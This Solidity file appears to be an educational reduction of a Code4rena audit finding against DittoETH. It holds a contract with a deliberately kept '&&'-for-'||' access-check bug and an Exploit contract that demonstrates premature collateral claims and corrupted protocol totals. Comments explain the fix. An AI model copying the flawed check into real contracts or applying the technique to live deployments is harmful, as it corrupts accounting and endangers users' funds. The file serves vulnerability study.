// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////
    DittoETH — [H-05] Flawed if check causes inaccurate tracking
    of the protocol's ercDebt and collateral
    (Code4rena 2024-03-dittoeth, Samuraii77, finding #34175)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: RedemptionFacet.claimRemainingCollateral() gates a
    shorter's early collateral claim with:

        if (claimProposal.shorter != msg.sender && claimProposal.shortId != id)
            revert Errors.CanOnlyClaimYourShort();

    Because `&&` short-circuits whenever msg.sender == claimProposal.shorter,
    the `id` argument is NEVER actually checked against claimProposal.shortId.
    A shorter can therefore name a REDEEMER whose dispute window has already
    elapsed, but pass the `id` of a COMPLETELY DIFFERENT Short Record whose
    OWN redeemer's dispute window has NOT elapsed yet — and the check still
    passes. This closes that other Short Record (paying out its collateral)
    before its rightful dispute window is over.

    That premature close doesn't corrupt anything by itself. The corruption
    happens when a disputer LEGITIMATELY disputes the still-open (and now
    partly stale) redemption proposal: disputeRedemption() blindly restores
    collateral/ercDebt onto every Short Record named in the proposal's slate
    (RedemptionFacet.sol#L263-L276) and re-credits the SAME amounts into the
    protocol's asset-level totals — without checking whether that Short
    Record has already been closed. The closed Short Record's fields are
    "resurrected" with nonzero collateral/ercDebt while its status stays
    Closed (so it's excluded from any sum over active Short Records), yet
    the asset-level totals were bumped as if it were still active. The
    protocol's core invariant — asset totals == sum of active Short Records
    — is now permanently wrong.
//////////////////////////////////////////////////////////////*/

contract Vulnerable {
    enum SR {
        Closed,
        Cancelled,
        PartialFill,
        FullyFilled
    }

    struct ShortRecord {
        uint88 collateral;
        uint88 ercDebt;
        SR status;
    }

    struct Proposal {
        address shorter;
        uint8 shortId;
        uint88 colRedeemed;
        uint88 ercDebtRedeemed;
    }

    struct RedeemerInfo {
        uint32 timeToDispute;
        bool active;
    }

    error InvalidRedemption();
    error TimeToDisputeHasNotElapsed();
    error CanOnlyClaimYourShort();

    mapping(address => mapping(uint8 => ShortRecord)) public shortRecords;
    mapping(address => Proposal[]) public proposals;
    mapping(address => RedeemerInfo) public redeemerInfo;

    // Asset-level totals — the protocol's core invariant is that these always
    // equal the sum of collateral/ercDebt across all NON-Closed Short Records.
    uint256 public assetCollateral;
    uint256 public assetErcDebt;

    uint32 public clock; // simulated protocol time (no vm.warp available)

    function advanceTime(uint32 dt) external {
        clock += dt;
    }

    function openShort(address shorter, uint8 shortId, uint88 collateral, uint88 ercDebt) external {
        shortRecords[shorter][shortId] = ShortRecord(collateral, ercDebt, SR.PartialFill);
        assetCollateral += collateral;
        assetErcDebt += ercDebt;
    }

    /// @notice Reduced RedemptionFacet.proposeRedemption(). Fully redeems the named
    /// Short Record's ercDebt out of the protocol (mirrors `Asset.ercDebt -=
    /// p.totalAmountProposed` at RedemptionFacet.sol#L152) and opens a dispute window
    /// for the caller (the redeemer). The Short Record's collateral stays in place,
    /// unclaimed, until the shorter reclaims it after the window elapses.
    function proposeRedemption(address shorter, uint8 shortId, uint32 disputeWindow) external {
        ShortRecord storage sr = shortRecords[shorter][shortId];
        require(sr.status != SR.Closed, "no SR");

        proposals[msg.sender].push(Proposal(shorter, shortId, sr.collateral, sr.ercDebt));

        assetErcDebt -= sr.ercDebt;
        sr.ercDebt = 0;
        sr.status = SR.FullyFilled;

        redeemerInfo[msg.sender] = RedeemerInfo(clock + disputeWindow, true);
    }

    /// @notice Reduced RedemptionFacet.claimRemainingCollateral() (RedemptionFacet.sol#L347-L364).
    /// The shorter reclaims a fully-redeemed Short Record's leftover collateral once the
    /// NAMED redeemer's dispute window has passed.
    function claimRemainingCollateral(address redeemer, uint8 claimIndex, uint8 id) external {
        RedeemerInfo memory info = redeemerInfo[redeemer];
        if (!info.active) revert InvalidRedemption();
        if (info.timeToDispute > clock) revert TimeToDisputeHasNotElapsed();

        Proposal memory claimProposal = proposals[redeemer][claimIndex];

        // ============ VULNERABLE CHECK (verbatim, RedemptionFacet.sol#L361) ============
        if (claimProposal.shorter != msg.sender && claimProposal.shortId != id) revert CanOnlyClaimYourShort();
        // @> VULN: `&&` instead of `||`. `id` is supposed to be cross-checked against
        //          claimProposal.shortId, but the `&&` short-circuits to `false`
        //          (no revert) whenever msg.sender == claimProposal.shorter — so `id`
        //          can name a COMPLETELY DIFFERENT Short Record than the one this
        //          redeemer's proposal is actually about.
        // FIX: if (claimProposal.shorter != msg.sender || claimProposal.shortId != id) revert ...;
        // ================================================================================

        _claimRemainingCollateral(msg.sender, id);
    }

    function _claimRemainingCollateral(address shorter, uint8 shortId) private {
        ShortRecord storage sr = shortRecords[shorter][shortId];
        if (sr.ercDebt == 0 && sr.status == SR.FullyFilled) {
            // @dev Mirrors the real code: collateral is paid out, but the SR's
            // `collateral` FIELD is never zeroed — only `status` flips to Closed
            // (see LibShortRecord.deleteShortRecord, which never touches
            // shortRecord.collateral). This stale, nonzero field is exactly what
            // lets disputeRedemption() "resurrect" a closed Short Record below.
            assetCollateral -= sr.collateral;
            sr.status = SR.Closed;
        }
    }

    /// @notice Reduced RedemptionFacet.disputeRedemption() (RedemptionFacet.sol#L263-L276).
    /// Restores collateral/ercDebt for every proposal from `incorrectIndex` onward back
    /// onto their Short Records, and re-credits the SAME amounts into the asset-level
    /// totals. It does NOT check whether the targeted Short Record has already been
    /// closed by a (buggy) premature claim.
    function disputeRedemption(address redeemer, uint8 incorrectIndex) external {
        Proposal[] memory props = proposals[redeemer];
        uint256 incorrectCollateral;
        uint256 incorrectErcDebt;
        for (uint256 i = incorrectIndex; i < props.length; i++) {
            Proposal memory p = props[i];
            ShortRecord storage sr = shortRecords[p.shorter][p.shortId];
            sr.collateral += p.colRedeemed;
            sr.ercDebt += p.ercDebtRedeemed;
            incorrectCollateral += p.colRedeemed;
            incorrectErcDebt += p.ercDebtRedeemed;
        }
        assetCollateral += incorrectCollateral;
        assetErcDebt += incorrectErcDebt;
        redeemerInfo[redeemer].active = false;
    }

    /// @notice Sums collateral/ercDebt across the given Short Records, counting only
    /// the ones that are NOT Closed — used to check the core protocol invariant
    /// (asset totals == sum of active Short Records) against the asset-level counters.
    function sumActiveShortRecords(address shorter, uint8[] calldata ids)
        external
        view
        returns (uint256 totalCollateral, uint256 totalErcDebt)
    {
        for (uint256 i = 0; i < ids.length; i++) {
            ShortRecord memory sr = shortRecords[shorter][ids[i]];
            if (sr.status != SR.Closed) {
                totalCollateral += sr.collateral;
                totalErcDebt += sr.ercDebt;
            }
        }
    }
}

/// @dev Tiny helper so each role (redeemer/redeemer2/disputer) has its own address,
/// without needing `vm.prank` cheatcodes.
contract Actor {
    function exec(address target, bytes calldata data) external {
        (bool ok, bytes memory ret) = target.call(data);
        if (!ok) {
            assembly {
                revert(add(ret, 32), mload(ret))
            }
        }
    }
}

contract Exploit {
    Vulnerable public v; // CREATE nonce 1
    Actor public redeemer; // CREATE nonce 2
    Actor public redeemer2; // CREATE nonce 3
    Actor public disputer; // CREATE nonce 4

    function run() external {
        v = new Vulnerable();
        redeemer = new Actor();
        redeemer2 = new Actor();
        disputer = new Actor();

        // The shorter (this Exploit contract) opens three Short Records.
        v.openShort(address(this), 1, 10 ether, 5000 ether); // will be redeemed by `redeemer`
        v.openShort(address(this), 2, 10 ether, 5000 ether); // will be redeemed by `redeemer2`
        v.openShort(address(this), 3, 50 ether, 8000 ether); // untouched, used only for the sum check

        // 1) `redeemer` proposes redemption of SR#1 with a SHORT dispute window.
        redeemer.exec(address(v), abi.encodeCall(v.proposeRedemption, (address(this), 1, 1)));
        v.advanceTime(2); // redeemer's dispute window has now elapsed

        // 2) `redeemer2` proposes redemption of SR#2 with a LONG dispute window — it is
        //    still fully open.
        redeemer2.exec(address(v), abi.encodeCall(v.proposeRedemption, (address(this), 2, 1_000_000)));

        // 3) The shorter calls claimRemainingCollateral naming `redeemer` (whose window
        //    elapsed) but with id = 2 — the Short Record belonging to redeemer2's
        //    STILL-OPEN proposal. The flawed `&&` check lets this through.
        v.claimRemainingCollateral(address(redeemer), 0, 2);

        (uint88 col2, uint88 debt2, Vulnerable.SR status2) = v.shortRecords(address(this), 2);
        require(status2 == Vulnerable.SR.Closed, "SR#2 should be prematurely closed");
        require(debt2 == 0, "SR#2 debt should be zero after the premature claim");

        // 4) A disputer LEGITIMATELY disputes redeemer2's proposal. This is ordinary,
        //    honest dispute behavior — it has no idea (and no way to check) that SR#2
        //    was already closed underneath it.
        disputer.exec(address(v), abi.encodeCall(v.disputeRedemption, (address(redeemer2), 0)));

        // Harm: SR#2's fields are resurrected with NONZERO collateral/debt even though
        // it is still Closed (so it's excluded from the "active" sum), while the
        // asset-level totals were bumped as if it were active. The core invariant is
        // now permanently broken.
        (uint88 col2After, uint88 debt2After, Vulnerable.SR status2After) = v.shortRecords(address(this), 2);
        require(status2After == Vulnerable.SR.Closed, "SR#2 must remain Closed");
        require(col2After > col2 && debt2After > 0, "SR#2 fields should be resurrected with nonzero values");

        uint8[] memory ids = new uint8[](3);
        ids[0] = 1;
        ids[1] = 2;
        ids[2] = 3;
        (uint256 totalCol, uint256 totalDebt) = v.sumActiveShortRecords(address(this), ids);

        require(
            v.assetCollateral() != totalCol,
            "harm not demonstrated: asset collateral should diverge from sum of active SRs"
        );
        require(
            v.assetErcDebt() != totalDebt, "harm not demonstrated: asset ercDebt should diverge from sum of active SRs"
        );
    }
}
